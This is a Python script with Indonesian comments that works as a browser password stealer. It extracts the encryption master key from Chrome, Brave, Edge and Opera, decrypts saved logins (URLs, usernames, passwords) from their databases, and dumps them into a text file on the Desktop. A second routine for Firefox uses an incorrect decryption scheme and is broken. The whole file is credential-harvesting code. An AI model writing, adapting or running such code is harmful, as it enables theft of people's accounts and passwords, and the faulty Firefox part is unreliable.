import os
import json
import sqlite3
import shutil
from base64 import b64decode
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData

# Lokasi Desktop untuk menyimpan file hasil
desktop = os.path.join(os.getenv("USERPROFILE"), "Desktop")
output_file = os.path.join(desktop, "BrowserData.txt")

# Direktori Profil Firefox
firefox_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')

# Direktori Browser Chromium
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable'
}

# Kuery Chromium untuk Login Data
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    }
}


def get_master_key_chromium(path: str):
    """Ambil Master Key dari Browser Chromium"""
    if not os.path.exists(path):
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password_chromium(buff: bytes, key: bytes) -> str:
    """Dekripsi Password dari Browser Chromium"""
    iv = buff[3:15]
    payload = buff[15:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
    decryptor = cipher.decryptor()
    decrypted_pass = decryptor.update(payload)
    return decrypted_pass[:-16].decode()


def save_to_file(content):
    """Simpan Semua Hasil ke Satu File TXT"""
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(content)
    print(f"[✔] Data ditambahkan ke {output_file}")


def get_data_chromium(path: str, profile: str, key, type_of_data):
    """Ambil Data dari Browser Chromium"""
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password_chromium(row[i], key)
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def get_firefox_master_key(profile):
    """Ambil Master Key dari Firefox"""
    key_db = os.path.join(firefox_dir, profile, 'key4.db')
    if not os.path.exists(key_db):
        return None
    conn = sqlite3.connect(key_db)
    cursor = conn.cursor()
    cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
    row = cursor.fetchone()
    conn.close()
    global_salt, encrypted_key = row[0], row[1]
    cipher = Cipher(algorithms.AES(global_salt), modes.CBC(encrypted_key))
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_key)


def decrypt_firefox_password(ciphertext, master_key):
    """Dekripsi Password dari Firefox"""
    iv = ciphertext[3:15]
    encrypted_data = ciphertext[15:]
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data).decode()


def get_firefox_logins(profile, master_key):
    """Ambil Data Login dari Firefox"""
    logins_path = os.path.join(firefox_dir, profile, 'logins.json')
    if not os.path.exists(logins_path):
        return "Logins file tidak ditemukan.\n"

    with open(logins_path, 'r') as f:
        logins = json.load(f)

    result = []
    for login in logins["logins"]:
        hostname = login["hostname"]
        encrypted_username = b64decode(login["encryptedUsername"])
        encrypted_password = b64decode(login["encryptedPassword"])
        username = decrypt_firefox_password(encrypted_username, master_key)
        password = decrypt_firefox_password(encrypted_password, master_key)
        result.append(f"URL: {hostname}\nUsername: {username}\nPassword: {password}\n\n")
    return "".join(result)


if __name__ == '__main__':
    if os.path.exists(output_file):
        os.remove(output_file)

    # Chromium Browsers
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            print(f"[✔] Memproses {browser_name}...")
            master_key = get_master_key_chromium(browser_path)
            data = get_data_chromium(browser_path, 'Default', master_key, data_queries['login_data'])
            save_to_file(f"\n--- {browser_name.capitalize()} ---\n{data}")

    # Firefox Browsers
    profiles = [p for p in os.listdir(firefox_dir) if p.endswith('.default-release')]
    for profile in profiles:
        print(f"[✔] Memproses Firefox profile: {profile}...")
        master_key = get_firefox_master_key(profile)
        if master_key:
            data = get_firefox_logins(profile, master_key)
            save_to_file(f"\n--- Firefox ({profile}) ---\n{data}")
